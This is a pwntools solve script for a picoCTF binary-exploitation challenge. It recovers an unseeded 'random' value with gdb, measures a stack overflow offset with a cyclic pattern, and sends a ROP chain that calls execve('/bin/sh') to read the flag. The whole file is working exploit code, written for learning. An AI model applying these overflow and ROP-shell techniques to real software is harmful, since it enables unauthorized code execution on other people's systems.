#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the <CTF> challenge <name>.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *
import struct

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

GDB_COMMAND = '''
file ./vuln
'''
# For whatever reason, we can resolve the symbol to `increment` but it comes back wrong? This points to the return after `increment` has finished inside of main.
INCREMENT_ADDRESS = 0x00400bbc
NUM_CYCLIC_BYTES = 360

def get_incremented_value():
    '''Open a debugger and get the value returned from the function `increment`. This is checked against the user's input. If the numbers match, we win!
    '''

    with gdb.debug(exe.path, gdbscript=GDB_COMMAND, api=True) as vuln:
        # Add our breakpoint (we could do this in the gdbscript, but I like the API).
        vuln.gdb.Breakpoint('* ' + str(INCREMENT_ADDRESS))

        vuln.gdb.continue_and_wait()

        # Get the selected frame, which will allow us to extract information regarding things like the registers, stack, etc.
        frame = vuln.gdb.selected_frame()

        # Get the return value of increment. This should be the same each time since the developer did not seed rand.
        rax = frame.read_register('rax')

        # Cast as an integer.
        return int(rax.cast(vuln.gdb.lookup_type('long')))


def find_offset_to_return_address(incremented_value):
    '''Purposefully overflow the buffer with a cyclic pattern and then inspect
    what the crashing address is. Returns the offset to the return address.
    '''
    # Run the process once so that it crashes.
    proc = process([exe.path])

    # Send the answer to the first question.
    proc.sendlineafter(b'What number would you like to guess?\n', str(incremented_value))

    # Generate a cyclic pattern so that we can auto-find the offset.
    payload = cyclic(NUM_CYCLIC_BYTES)

    # Send the cyclic pattern
    proc.sendlineafter(b'Congrats! You win! Your prize is this print statement!\n', payload)
    proc.wait()

    # Get the core dump.
    core = proc.corefile

    # The faulting address should be some subset of bytes inside our cyclic
    # pattern.
    assert pack(core.fault_addr) in payload, "Faulting address not in the \
                                                cyclic pattern."

    # Find our offset.
    offset = cyclic_find(pack(core.fault_addr), n=4)
    return offset


def call_execve():
    '''Return the ROP chain to land a shell.
    '''
    # rop = ROP(exe)
    # rop.call('execve', [b'/bin/sh'])
    # return rop.chain()

    # ropper --file ./vuln --chain "execve cmd=/bin/sh"
    p = lambda x : struct.pack('Q', x)

    IMAGE_BASE_0 = 0x0000000000400000 # f01c7ecf217d3cebdf4f676920f17ebfcb33d5d14d78df8dfffed5c5290e6f62
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)
    rop = b''

    rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
    rop += rebase_0(0x00000000002ba0e0)
    rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
    rop += rebase_0(0x00000000002ba0e8)
    rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
    rop += rebase_0(0x00000000002ba0e0)
    rop += rebase_0(0x0000000000010ca3) # 0x0000000000410ca3: pop rsi; ret;
    rop += rebase_0(0x00000000002ba0e8)
    rop += rebase_0(0x000000000004cc26) # 0x000000000044cc26: pop rdx; ret;
    rop += rebase_0(0x00000000002ba0e8)
    rop += rebase_0(0x00000000000163f4) # 0x00000000004163f4: pop rax; ret;
    rop += p(0x000000000000003b)
    rop += rebase_0(0x0000000000049e35) # 0x0000000000449e35: syscall; ret;
    return rop


def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('jupiter.challenges.picoctf.org', 51462)

    else:
        io = process([exe.path])

    return io



def main():
    '''Return the flag.
    '''
    # Get our initial information.
    with process([exe.path]) as io:
        # Get the answer, which is a 'random' value incremented by one.
        answer = get_incremented_value()
        log.info(f'The answer is: {answer}')

        # Pass the answer to the first question.
        offset = find_offset_to_return_address(answer)
        log.info(f'The offset to the return address is: {offset}')

    with conn() as io:
        # Send the first answer.
        io.sendlineafter(b'What number would you like to guess?\n', str(answer))

        ropchain = fit ({
            offset: call_execve()
        })

        io.sendlineafter(b'Name? ', ropchain)
        # Get the flag.
        #io.recvline()
        #io.recvline()
        io.sendline(b'cat flag.txt')
        # Get the flag back.
        io.recvline()
        io.recvline()
        flag = io.recv()
        # print('test')


        log.success(f'Flag: {flag}')
        return flag






if __name__ == "__main__":
    main()
    pass

